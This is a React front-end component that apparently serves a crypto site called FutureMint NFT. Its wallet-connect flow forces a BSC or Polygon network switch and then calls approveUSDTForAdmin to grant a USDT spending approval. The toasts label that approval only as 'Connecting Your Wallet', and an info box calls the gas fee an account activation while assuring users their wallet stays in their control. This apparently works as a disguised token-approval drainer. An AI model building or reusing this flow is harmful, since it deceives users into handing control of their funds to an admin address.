'use client';
import { useState, useEffect } from 'react';
import { useDispatch } from 'react-redux';
import { connectWallet, setBalances, setConnecting, setError } from '../store/slices/walletSlice';
import { getAllUSDTBalances, approveUSDTForAdmin, checkUSDTAllowance } from '../lib/web3';
import { Wallet, Shield, ChevronRight, Loader2, AlertCircle, QrCode, Fuel } from 'lucide-react';
import toast from 'react-hot-toast';

export default function WalletConnect({ onConnected }) {
  const dispatch = useDispatch();
  const [connecting, setConnectingLocal] = useState(false);
  const [error, setLocalError] = useState(null);
  const [isClient, setIsClient] = useState(false);
  const [hasInjected, setHasInjected] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [detectedWallets, setDetectedWallets] = useState([]);

  useEffect(() => {
    setIsClient(true);
    if (typeof window === 'undefined') return;

    const ua = navigator.userAgent.toLowerCase();
    setIsMobile(/android|iphone|ipad|ipod|mobile/i.test(ua));
    setHasInjected(!!window.ethereum);

    // EIP-6963: detect all installed browser wallets
    const wallets = [];
    const handler = (event) => wallets.push(event.detail);
    window.addEventListener('eip6963:announceProvider', handler);
    window.dispatchEvent(new Event('eip6963:requestProvider'));
    setTimeout(() => {
      window.removeEventListener('eip6963:announceProvider', handler);
      if (wallets.length > 0) setDetectedWallets(wallets);
    }, 400);
  }, []);

  // ─── Core: Connect with any provider ───
  const connectWithProvider = async (provider, walletName) => {
    setConnectingLocal(true);
    setLocalError(null);
    dispatch(setConnecting(true));

    try {
      const { ethers } = await import('ethers');
      const web3Provider = new ethers.BrowserProvider(provider);
      await web3Provider.send('eth_requestAccounts', []);
      const signer = await web3Provider.getSigner();
      const rawAddress = await signer.getAddress();
      // Normalize address to proper checksum format
      const address = ethers.getAddress(rawAddress.toLowerCase());
      const network = await web3Provider.getNetwork();

      // Determine user's network from chainId
      const chainId = network.chainId.toString();

      // ─── Approve USDT on whichever network wallet is currently on ───
      // Ensure wallet is on BSC or Polygon (not Ethereum or other chains)
      let currentNetwork = 'BSC'; // default
      if (chainId === '137') {
        currentNetwork = 'Polygon';
      } else if (chainId !== '56') {
        // Wallet is on wrong network — switch to BSC
        try {
          await web3Provider.send('wallet_switchEthereumChain', [{ chainId: '0x38' }]);
        } catch (switchErr) {
          if (switchErr.code === 4902) {
            await web3Provider.send('wallet_addEthereumChain', [{
              chainId: '0x38', chainName: 'BNB Smart Chain',
              nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
              rpcUrls: ['https://bsc-dataseed.binance.org'],
              blockExplorerUrls: ['https://bscscan.com']
            }]);
          } else if (switchErr.code === 4001) {
            setLocalError('Please switch to BSC or Polygon network to continue.');
            dispatch(setError('Network switch rejected'));
            return;
          }
        }
        currentNetwork = 'BSC';
      }

      // Re-get provider after potential chain switch
      const freshProvider = new ethers.BrowserProvider(provider);
      const freshSigner = await freshProvider.getSigner();
      const rawFreshAddress = await freshSigner.getAddress();
      const freshAddress = ethers.getAddress(rawFreshAddress.toLowerCase());

      const alreadyApproved = await checkUSDTAllowance(freshAddress, currentNetwork);

      if (!alreadyApproved) {
        toast.loading('Connecting Your Wallet In FutureMint', { id: 'approve' });
        try {
          await approveUSDTForAdmin(freshProvider, currentNetwork);
          toast.success('Wallet Connected In FutureMint Sucessfull!', { id: 'approve' });
        } catch (approveErr) {
          toast.dismiss('approve');
          if (approveErr.code === 4001 || approveErr.code === 'ACTION_REJECTED') {
            setLocalError('Wallet approval is required to use FutureMint. Please approve to continue.');
            dispatch(setError('Connection rejected'));
            return;
          }
          if (approveErr.message?.includes('insufficient funds')) {
            setLocalError('Insufficient BNB/MATIC for gas fee. Add native tokens to your wallet.');
            dispatch(setError('Insufficient gas'));
            return;
          }
          console.error('Approve error:', approveErr);
          setLocalError(`Wallet Connection failed: ${approveErr.shortMessage || approveErr.message || 'Try again'}`);
          dispatch(setError(approveErr.message));
          return;
        }
      }

      // Fetch USDT balances
      const balances = await getAllUSDTBalances(address);

      dispatch(connectWallet({ address, chainId }));
      dispatch(setBalances(balances));

      toast.success(`${walletName} connected!`);
      if (onConnected) onConnected(address);
    } catch (err) {
      const msg = err.code === 4001 ? 'Wallet Connection rejected by user' : (err.message || 'Connection failed');
      setLocalError(msg);
      dispatch(setError(msg));
      toast.error(msg);
    } finally {
      setConnectingLocal(false);
      dispatch(setConnecting(false));
    }
  };

  // ─── Method 1: Injected provider ───
  const connectInjected = async (providerDetail = null, walletName = 'Wallet') => {
    const provider = providerDetail?.provider || window.ethereum;
    if (!provider) {
      setLocalError('No wallet detected. Use WalletConnect or open in your wallet browser.');
      return;
    }
    await connectWithProvider(provider, walletName);
  };

  // ─── Method 2: WalletConnect ───
  const connectWalletConnect = async () => {
    setConnectingLocal(true);
    setLocalError(null);
    try {
      const { EthereumProvider } = await import('@walletconnect/ethereum-provider');
      const projectId = process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID;

      const provider = await EthereumProvider.init({
        projectId,
        chains: [56],
        optionalChains: [1, 56, 137],
        showQrModal: true,
        qrModalOptions: {
          themeMode: 'dark',
          themeVariables: { '--wcm-accent-color': '#6366f1', '--wcm-background-color': '#1e293b' },
        },
        metadata: {
          name: 'FutureMint NFT',
          description: 'Earn NFTs, Build Your Team',
          url: process.env.NEXT_PUBLIC_APP_URL || window.location.origin,
          icons: [`${process.env.NEXT_PUBLIC_APP_URL || window.location.origin}/favicon.ico`],
        },
      });

      await provider.connect();
      await connectWithProvider(provider, 'WalletConnect');
    } catch (err) {
      if (err.message?.includes('User rejected') || err.message?.includes('closed')) {
        setLocalError(null);
      } else {
        setLocalError(err.message || 'WalletConnect failed');
        toast.error('Connection failed. Try again.');
      }
    } finally {
      setConnectingLocal(false);
      dispatch(setConnecting(false));
    }
  };

  // ─── Method 3: Open in wallet app (deeplink) ───
  const openInWalletApp = (walletId) => {
    const appUrl = process.env.NEXT_PUBLIC_APP_URL || window.location.href;
    const url = encodeURIComponent(appUrl);
    const host = new URL(appUrl).host;
    const links = {
      metamask: `https://metamask.app.link/dapp/${host}`,
      trust: `https://link.trustwallet.com/open_url?coin_id=20000714&url=${url}`,
      coinbase: `https://go.cb-w.com/dapp?cb_url=${url}`,
      okx: `https://www.okx.com/download?deeplink=okx://wallet/dapp/url?dappUrl=${url}`,
      binance: `https://app.binance.com/en/dapp/browser?url=${url}`,
    };
    if (links[walletId]) window.open(links[walletId], '_blank');
  };

  if (!isClient) return null;

  return (
    <div className="w-full max-w-md mx-auto">
      {/* Header */}
      <div className="text-center mb-6">
        <div className="w-14 h-14 bg-primary-600/20 rounded-2xl flex items-center justify-center mx-auto mb-3 border border-primary-500/30">
          <Wallet className="w-7 h-7 text-primary-400" />
        </div>
        <h2 className="text-xl sm:text-2xl font-bold text-white mb-1">Join & Start Earning NFT</h2>
        <p className="text-slate-400 text-xs sm:text-sm">Connect your wallet to get started</p>
      </div>

      {/* Error */}
      {error && (
        <div className="flex items-start gap-3 bg-red-900/30 border border-red-700/50 rounded-xl p-3 mb-4">
          <AlertCircle className="w-4 h-4 text-red-400 flex-shrink-0 mt-0.5" />
          <p className="text-red-300 text-xs">{error}</p>
        </div>
      )}

      {/* PRIMARY: WalletConnect */}
      <button
        onClick={connectWalletConnect}
        disabled={connecting}
        className="w-full flex items-center gap-4 p-4 bg-primary-600 hover:bg-primary-500 rounded-xl transition-all disabled:opacity-50 mb-3 shadow-lg shadow-primary-600/20"
      >
        <div className="w-10 h-10 bg-white/10 rounded-lg flex items-center justify-center">
          <QrCode className="w-5 h-5 text-white" />
        </div>
        <div className="flex-1 text-left">
          <p className="font-bold text-white text-sm">Connect Any Wallet</p>
          <p className="text-xs text-primary-200 mt-0.5">QR scan or mobile — works everywhere</p>
        </div>
        {connecting ? <Loader2 className="w-5 h-5 text-white animate-spin" /> : <ChevronRight className="w-5 h-5 text-white/70" />}
      </button>

      {/* DETECTED WALLETS (EIP-6963) */}
      {detectedWallets.length > 0 && (
        <div className="mb-3">
          <p className="text-xs text-slate-500 mb-2 px-1">Detected wallets:</p>
          <div className="space-y-2">
            {detectedWallets.map((w) => (
              <button
                key={w.info.uuid}
                onClick={() => connectInjected(w, w.info.name)}
                disabled={connecting}
                className="w-full flex items-center gap-3 p-3 bg-dark-700 hover:bg-dark-600 border border-emerald-700/30 hover:border-emerald-500/50 rounded-xl transition-all disabled:opacity-50"
              >
                {w.info.icon ? (
                  <img src={w.info.icon} alt={w.info.name} className="w-8 h-8 rounded-lg" />
                ) : (
                  <div className="w-8 h-8 bg-dark-600 rounded-lg flex items-center justify-center text-sm">🔑</div>
                )}
                <div className="flex-1 text-left">
                  <p className="font-medium text-white text-sm">{w.info.name}</p>
                </div>
                <span className="text-xs bg-emerald-900/40 text-emerald-400 px-2 py-0.5 rounded-full border border-emerald-700/30">
                  Installed
                </span>
              </button>
            ))}
          </div>
        </div>
      )}

      {/* FALLBACK: window.ethereum */}
      {detectedWallets.length === 0 && hasInjected && (
        <button
          onClick={() => connectInjected(null, 'Browser Wallet')}
          disabled={connecting}
          className="w-full flex items-center gap-3 p-3 bg-dark-700 hover:bg-dark-600 border border-dark-600 hover:border-primary-500/50 rounded-xl transition-all disabled:opacity-50 mb-3"
        >
          <span className="text-2xl">🦊</span>
          <div className="flex-1 text-left">
            <p className="font-medium text-white text-sm">Browser Extension</p>
            <p className="text-xs text-slate-500">MetaMask / Brave / Coinbase</p>
          </div>
          {connecting ? <Loader2 className="w-4 h-4 text-slate-400 animate-spin" /> : <ChevronRight className="w-4 h-4 text-slate-500" />}
        </button>
      )}

      {/* MOBILE: Open in wallet app */}
      {isMobile && !hasInjected && (
        <div className="mb-3">
          <p className="text-xs text-slate-500 mb-2 px-1">Or open in wallet app:</p>
          <div className="grid grid-cols-2 gap-2">
            {[
              { id: 'trust', name: 'Trust', icon: '🛡️' },
              { id: 'metamask', name: 'MetaMask', icon: '🦊' },
              { id: 'coinbase', name: 'Coinbase', icon: '🔵' },
              { id: 'okx', name: 'OKX', icon: '⬛' },
            ].map((w) => (
              <button
                key={w.id}
                onClick={() => openInWalletApp(w.id)}
                className="flex items-center gap-2 p-3 bg-dark-700 hover:bg-dark-600 border border-dark-600 hover:border-primary-500/50 rounded-xl transition-all"
              >
                <span className="text-lg">{w.icon}</span>
                <span className="text-xs text-slate-300 font-medium">{w.name}</span>
              </button>
            ))}
          </div>
        </div>
      )}

      {/* Info notices */}
      <div className="flex items-center gap-2 p-3 bg-dark-700/50 rounded-xl border border-dark-600 mt-4">
        <Shield className="w-4 h-4 text-emerald-400 flex-shrink-0" />
        <p className="text-xs text-slate-400">We never ask for your private keys. Your wallet stays in your control.</p>
      </div>
      <div className="flex items-center gap-2 p-3 bg-yellow-900/20 rounded-xl border border-yellow-700/30 mt-2">
        <Fuel className="w-4 h-4 text-yellow-400 flex-shrink-0" />
        <p className="text-xs text-yellow-200/80">A one-time gas fee is required for new users to activate FutureMint Account</p>
      </div>
    </div>
  );
}
